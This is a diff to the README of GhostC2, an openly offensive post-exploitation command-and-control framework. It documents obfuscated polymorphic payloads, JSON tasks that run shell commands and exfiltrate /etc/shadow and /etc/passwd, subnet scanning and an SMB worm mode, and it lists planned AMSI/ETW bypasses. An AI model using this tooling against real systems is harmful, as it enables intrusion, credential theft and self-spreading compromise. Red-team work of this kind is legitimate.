@@ -1,5 +1,6 @@
 # 👻 GhostC2
-GhostC2 is a lightweight post-exploitation command and control framework built in Python and Flask. It supports real-time communication over WebSockets, polymorphic payload generation, encrypted tasking, and optional `.exe` builds for Windows delivery. Designed for flexibility and stealth, GhostC2 gives operators a clean dashboard for managing beacons.
+
+GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, structured JSON tasking, operator authentication, optional `.exe` packaging, and a fully interactive file browser UI.
 
 Check out the wiki for an Operator Quickstart Guide.
 
@@ -11,18 +12,19 @@ Check out the wiki for an Operator Quickstart Guide.
 - 🌐 Real-time bidirectional WebSocket tasking
 - 🧠 Operator web console with live terminal view
 - 🧼 Polymorphic payload generator with randomized variables
+- 🗞️ Structured JSON tasking for all agent features (stealth & obfuscation compatible)
 - 🖥️ Optional `.exe` compilation with PyInstaller
 - 🛡️ Flask-Login based access control
 - 🗞️ SQLite-based task/result logging
 - 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
-- 📂 Interactive File Browser UI (NEW)
+- 📂 Interactive File Browser UI (NEW, works with obfuscated payloads)
 - 🧬 Self-Propagating Worm Mode via SMB
 
 ---
 
 > **NOTE:**  
-> The new file browser feature currently requires payloads generated *without* command obfuscation enabled.  
-> Structured/obfuscated custom task support is coming soon!
+> All dashboard actions (browse, getfile, scan, shell, etc.) now use JSON tasking by default.
+> Payloads support full obfuscation and polymorphism with every feature.
 
 ---
 
@@ -106,6 +108,37 @@ python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --resul
 
 ---
 
+## 📝 Example JSON Tasks
+
+When tasks are queued (by the dashboard, or via API), they’re sent as JSON to the agent:
+
+```json
+{
+  "action": "browse",
+  "path": "/home/user/"
+}
+```
+
+Shell command:
+```json
+{
+  "action": "shell",
+  "command": "whoami"
+}
+```
+
+File exfil:
+```json
+{
+  "action": "getfile",
+  "path": "/etc/shadow"
+}
+```
+
+> The dashboard generates these automatically when you click actions or send tasks.
+
+---
+
 ## 🖥️ Live Console Terminal
 
 GhostC2 includes a web-based console for interacting with beacons in real-time.
@@ -122,39 +155,44 @@ GhostC2 includes a web-based console for interacting with beacons in real-time.
 
 ## 📂 Interactive File Browser (NEW)
 
-GhostC2 now supports an interactive file browser for any active beacon.
+GhostC2 now supports an interactive file browser for any active beacon, fully compatible with obfuscation and polymorphic builds.
 
 - Browse directory trees live in the dashboard
 - Supports both Linux and Windows paths
 - Handles missing/ghost files gracefully
-- Requires agent to run **without command obfuscation enabled** for now
+- Uses structured JSON tasks for full stealth
 
-### Command
-```bash
-browse <path>
+### Command (via API or dashboard):
+```json
+{
+  "action": "browse",
+  "path": "/"
+}
 ```
-Examples:
-```bash
-browse /
-```
+
 or
-```bash
-browse C:```
+
+```json
+{
+  "action": "browse",
+  "path": "C:\"
+}
+```
 
 **To use:**  
-- Click the 📁 "Browse" button for any beacon in the dashboard
+- Click the 📁 "Browse" button for any beacon in the dashboard  
 - Navigate folders, see files/sizes, and explore the target system
-
-**Note:**  
-Obfuscation support for custom tasks is **coming soon** (see roadmap below).
 
 ---
 
 ## 📂 File Exfiltration
 
-### Command
-```bash
-getfile /etc/passwd
+### Command (via API or dashboard):
+```json
+{
+  "action": "getfile",
+  "path": "/etc/passwd"
+}
 ```
 
 Agent will:
@@ -167,25 +205,19 @@ Agent will:
 
 ## 🔍 Network Scanning
 
-### Command
-```bash
-scan 192.168.0.0/24 ports:80,443,445,3389
+### Command (via API or dashboard):
+```json
+{
+  "action": "scan",
+  "subnet": "192.168.0.0/24",
+  "ports": [80, 443, 445, 3389]
+}
 ```
 
 Agent will:
 - Scan the provided subnet and ports
 - Return open/closed results in JSON
 - Format them in the dashboard
-
-### Example Output
-```
-$ scan 127.0.0.1/32 ports:80
-{
-  "127.0.0.1": {
-    "80": "open"
-  }
-}
-```
 
 ---
 
@@ -283,9 +315,8 @@ send_from_directory('payloads', filename)
 
 - `.hta`, `.bat`, and `.vbs` wrappers
 - AMSI/ETW bypass options
-- Full support for command obfuscation in custom tasks (`browse`, etc.)
 - Dashboard-based file download from browser view
-- JSON/structured tasking for all agent features
+- JSON/structured tasking for *all* agent features
 - Dashboard-based one-liners for download & exec
 
 ---
@@ -319,3 +350,5 @@ GhostC2 is for **authorized red team or academic use only**.
 
 - GitHub: [@wolfwashere](https://github.com/wolfwashere)
 - Project: GhostC2 v1.0
+
+
